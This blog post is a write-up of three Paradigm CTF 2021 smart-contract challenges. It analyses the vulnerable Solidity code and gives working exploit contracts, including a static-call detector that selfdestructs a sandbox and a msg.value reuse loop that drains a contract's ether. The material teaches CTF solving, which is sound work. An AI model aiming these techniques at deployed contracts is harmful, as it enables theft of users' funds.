@@ -1,0 +1,310 @@
+# Paradigm CTF 2021 - Smart Contract Challenges Write-Up #1
+
+<p className="text-xs text-right">August 12, 2022 by [patrickd](/about#patrickd)</p>
+
+Due to being late to the party, I missed the Paradigm CTF of 2021 - but not this year!
+
+[Paradigm CTF 2022](https://ctf.paradigm.xyz/) is coming up on the 20th of August, and it's time to get ready. So let's take a look at the challenges from last year!
+
+
+
+## BabySandbox
+
+> I read that staticcall will keep my contracts safe.
+
+This challenge consists of two contracts, the first of which, [*Setup.sol*](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/babysandbox/public/contracts/Setup.sol) appears to both deploy the other ([*BabySandbox.sol*](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/babysandbox/public/contracts/BabySandbox.sol)) and also have a function to check for whether we succeeded:
+
+```solidity
+function isSolved() public view returns (bool) {
+    uint size;
+    assembly {
+        size := extcodesize(sload(sandbox.slot))
+    }
+    return size == 0;
+}
+```
+
+Which appears to be the case when the code-size of the deployed `BabySandbox` contract becomes 0 - so we have to somehow manage to `selfdestruct` it?
+
+Looking at the contract in question, we're greeted by intimidating assembly, but only one function: `run(address code) {}` - which can be broken down to:
+
+* If the contract is calling itself, execute a **delegate-call** to the specified address (this should be where we can specify an address that allows us to selfdestruct this contract).
+* Otherwise, forward the current call via a **static-call** to itself and only if it doesn't fail, make another normal **call** to itself.
+
+The [`STATICCALL`](https://www.evm.codes/#fa) opcode "is equivalent to `CALL`, except that it does not allow any state modifying instructions". It's basically what ensures that Solidity `view`-functions are more than just syntactic sugar (unlike `pure` functions which do not have an opcode to ensure that no chain state is read). Since it's state-changing, `SELFDESTRUCT` is one of the opcodes that is disallowed during a *static-call*.
+
+First question is: How can we detect whether we've been *static-called* so that we can act differently when we're not?
+
+If we'd attempt to change state, that would revert. How can we catch a revert? Assuming that all sub-calls made by a function that was static-called, also share the same restrictions, we should be able to use a normal *call* and see whether it reverted or not?
+
+We can check quickly this assumption with a quick & dirty script on [remix](https://remix.ethereum.org/):
+
+```solidity
+contract CallDetector {
+    // Can we detect a static call?
+    function staticCallSelf() external returns (bool isStaticCall) {
+        (, bytes memory data) = address(this).staticcall(abi.encodeWithSelector(this.amIbeingStaticCalled.selector));
+        (isStaticCall) = abi.decode(data, (bool));
+    }
+    // Can we differentiate it from a normal call?
+    function normalCallSelf() external returns (bool isStaticCall) {
+        (, bytes memory data) = address(this).call(abi.encodeWithSelector(this.amIbeingStaticCalled.selector));
+        (isStaticCall) = abi.decode(data, (bool));
+    }
+    function amIbeingStaticCalled() external returns (bool isStaticCall) {
+        (bool success, ) = address(this).call(abi.encodeWithSelector(this.stateChangingAction.selector));
+        isStaticCall = !success;
+    }
+    event Ping();
+    function stateChangingAction() external {
+        emit Ping();
+    }
+}
+```
+
+And indeed, `amIbeingStaticCalled()` can successfully differentiate how it has been called. Based on this we can add logic to either self-destruct, or not.
+
+```solidity
+contract Exploit {
+    BabySandbox immutable babySandbox;
+    address immutable exploit;
+    constructor(BabySandbox _babySandbox) {
+        babySandbox = _babySandbox;
+        // Save actual exploit address since it's not accessible during delegate-calls.
+        exploit = address(this);
+    }
+    function pwn() external {
+        babySandbox.run(address(this));
+    }
+    // The delegate-call is made without calldata, so fallback will be triggered.
+    fallback() external {
+        (bool success, ) = exploit.call(abi.encodeWithSelector(this.stateChangingAction.selector));
+        if (success) {
+            selfdestruct(payable(address(0x0)));
+        }
+    }
+    event Ping();
+    function stateChangingAction() external {
+        emit Ping();
+    }
+}
+```
+
+That works! Cool challenge!
+
+
+## Bouncer
+
+> Can you enter the party?
+
+In this challenge we can again find both setup steps and success conditions within [*Setup.sol*](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/bouncer/public/contracts/Setup.sol):
+
+* `Bouncer` contract is deployed with 50 ether
+* Not sure what these lines do yet, but `weth` is Wrapped Ether as [WETH9](0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
+  * `bouncer.enter{value: 1 ether}(address(weth), 10 ether);{:solidity}`
+  * `bouncer.enter{value: 1 ether}(ETH, 10 ether);{:solidity}`
+* A `Party` contract is initialized and the `bouncer` is passed to it
+
+The success conditions are apparently to make it so that the bouncer's ether balance becomes 0.
+
+Opening [*Bouncer.sol*](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/bouncer/public/contracts/Bouncer.sol) reveals a whole bunch of functions, but which one allows removing the balance?
+
+```solidity
+function redeem(ERC20Like token, uint256 amount) public {
+    tokens[msg.sender][address(token)] -= amount;
+    payout(token, msg.sender, amount);
+}
+function payout(ERC20Like token, address to, uint256 amount) private {
+    if (address(token) == ETH) {
+        payable(to).transfer(amount);
+    } else {
+        require(token.transfer(to, amount), "err/not enough tokens");
+    }
+}
+```
+
+Owner-authenticated functions aside, it seems there's only one: The internal `payout()` function, callable via `redeem()`.
+
+Unlike the previous challenge, this one is using Solidity 0.8.0, so we won't be able to exploit an underflow when the balance is updated.
+
+There's only one function where we can influence the `tokens` variable:
+
+```solidity
+function convert(address who, uint256 id) payable public {
+    Entry memory entry = entries[who][id];
+    require(block.timestamp != entry.timestamp, "err/wait after entering");
+    if (address(entry.token) != ETH) {
+        require(entry.token.allowance(who, address(this)) == type(uint256).max, "err/must give full approval");
+    }
+    require(msg.sender == who || msg.sender == delegates[who]);
+    proofOfOwnership(entry.token, who, entry.amount);
+    tokens[who][address(entry.token)] += entry.amount;
+}
+```
+
+So, `entries` can be converted to `tokens` which can be withdrawn..
+
+```solidity
+function enter(address token, uint256 amount) public payable {
+    require(msg.value == entryFee, "err fee not paid");
+    entries[msg.sender].push(Entry ({
+        amount: amount,
+        token: ERC20Like(token),
+        timestamp: block.timestamp
+    }));
+}
+```
+
+And that's where we come back to the `enter()` function from the setup.
+
+Based on the fact that the fee collection happening in it will lead to a fee ether balance to accrue that is only intended to be withdrawn via the owner-authenticated `claimFees()` function - it's safe to say that there must be some way to withdraw the same `entry` multiple times.
+
+And whenever it's about re-using the same ether value, there's one thing to look out for: `msg.value` being checked within a loop!
+
+The message value check is happening within the `proofOwnership()` function, which is called during the token conversion:
+
+```solidity
+function proofOfOwnership(ERC20Like token, address from, uint256 amount) public payable {
+    if (address(token) == ETH) {
+        require(msg.value == amount, "err/not enough tokens");
+    } else {
+        require(token.transferFrom(from, address(this), amount), "err/not enough tokens");
+    }
+}
+```
+
+And the loop we're looking for can be found in `convertMany()`:
+
+```solidity
+function convertMany(address who, uint256[] memory ids) payable public {
+    for (uint256 i = 0; i < ids.length; i++) {
+        convert(who, ids[i]);
+    }
+}
+```
+
+And thanks to the fact that nothing is preventing us from sending the same entry `id` over and over again, we only have to pay the fee once!
+
+```solidity
+contract Exploit {
+    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+    Bouncer immutable bouncer;
+    constructor(Bouncer _bouncer) payable {
+        bouncer = _bouncer;
+
+        // We'll enter during construction, since the conversion function
+        // wants to be called in a separate transaction/block.
+        bouncer.enter{value: 1 ether}(ETH, 1 ether);
+    }
+    function pwn() external {
+        // The amount of ether send to bouncer will be 53 at this point.
+        // The next ether we'll send during convertMany() will be re-used 54 times
+        // to be able to withdraw everything later.
+        uint256[] memory ids = new uint256[](54);
+        for (uint256 idx; idx < 54; idx++) {
+            // The index of the first entry by this contract will be at 0.
+            // We'll be re-using that entry over and over again for conversion.
+            ids[idx] = 0;
+        }
+
+        bouncer.convertMany{value: 1 ether}(address(this), ids);
+
+        bouncer.redeem(ERC20Like(ETH), 54 ether);
+    }
+    receive() payable external {}
+}
+```
+
+Not the most gas efficient way to solve it, but it works!
+
+A classic issue hidden within a lot of noise...
+
+
+## Secure
+
+> My contract is 100% secure, it's impossible to hack.
+
+```solidity
+constructor() public payable {
+    require(msg.value == WANT);
+
+    address tokenModule = address(new TokenModule());
+
+    wallet = new Wallet();
+    wallet.allowModule(tokenModule);
+
+    WETH.deposit.value(msg.value)();
+    WETH.approve(address(wallet), uint(-1));
+
+    wallet.execModule(tokenModule, abi.encodeWithSelector(TokenModule(0x00).deposit.selector, WETH, address(this), msg.value));
+}
+
+function isSolved() public view returns (bool) {
+    return WETH.balanceOf(address(this)) == WANT;
+}
+```
+
+This time around [*Setup.sol*](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/secure/public/contracts/Setup.sol) appears to be setting up a Wallet. This Wallet seems to use modules for adding functionality such as the handling of ERC20 Tokens.
+
+The `WANT` constant demands that 50 ether worth of WETH are deposited from the Setup into the Wallet and it appears the goal is to get them out of the wallet back into the hands of the Setup contract.
+
+A first look at [*Wallet.sol*](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/secure/public/contracts/Wallet.sol) reveals a contract that only has authenticated functions that we shouldn't be able to call. But what strikes me as rather strange is the Solidity version: 0.5.12 - maybe there's a compiler bug here?
+
+To check that, there's the official [*bugs_by_version.json*](https://github.com/ethereum/solidity/blob/develop/docs/bugs_by_version.json) file, where we can find all known issues for this compiler version:
+
+```json
+"0.5.12": {
+    "bugs": [
+        "AbiReencodingHeadOverflowWithStaticArrayCleanup",
+        "DirtyBytesArrayToStorage",
+        "NestedCallataArrayAbiReencodingSizeValidation",
+        "ABIDecodeTwoDimensionalArrayMemory",
+        "KeccakCaching",
+        "EmptyByteArrayCopy",
+        "DynamicArrayCleanup",
+        "ImplicitConstructorCallvalueCheck",
+        "TupleAssignmentMultiStackSlotComponents",
+        "MemoryArrayCreationOverflow",
+        "privateCanBeOverridden",
+        "YulOptimizerRedundantAssignmentBreakContinue0.5"
+    ],
+    "released": "2019-10-01"
+},
+```
+
+Comparing these with the version before (0.5.11) and after (0.5.13) doesn't show a difference that would suggest that a bug was newly introduced or fixed - guess that would've been too easy..
+
+I checked each of the more detailed bug descriptions in [*bugs.json*](https://github.com/ethereum/solidity/blob/develop/docs/bugs.json) but none seemed relevant..
+
+So, maybe it wasn't a bug, but just a really weird and unexpected quirk in 0.5.x? Or is all that just a distraction?
+
+```solidity
+function addOperator(address operator) public onlyOwner {
+    _operators[owner] = true;
+}
+
+function removeOperator(address operator) public onlyOwner {
+    _operators[owner] = false;
+}
+```
+
+After some more intensive staring, I noticed that the `operator` management functions are actually broken. The owner will only be able to set and unset themselves as operator, but unable to set anyone else since the `operator` function parameter is simply not used. Probably not relevant to the actual solution, but maybe a hint that other "dumb mistakes" are hiding here? I don't see one..
+
+After a lot of trial, error, and debugging around the idea there might be some memory address wrapping going on with the `bytes memory data` of the `execModule()` allowing to overwrite the scratch space and therefore the calculation of the `operators` mapping slot... blah blah. Let's just say I spend a lot of time trying to find a way of exploiting a bug that doesn't exist.
+
+At some point I was like: Hm, the challenge's solve-condition is that the Setup contract needs to have 50 ether. That can't possibly mean that I simply have to send 50 ether from the player account to the Setup contract, right? That would be so stupid and lame, right?
+
+Well, I couldn't take it anymore and took a peek at the [solution contract](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/secure/private/Exploit.sol):
+
+```solidity
+contract Exploit {
+    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+
+    constructor(Setup setup) public payable {
+        WETH.deposit.value(50 ether)();
+        WETH.transfer(address(setup), 50 ether);
+    }
+}
+```
+
+wow.... excuse me while I'll find a table to flip.
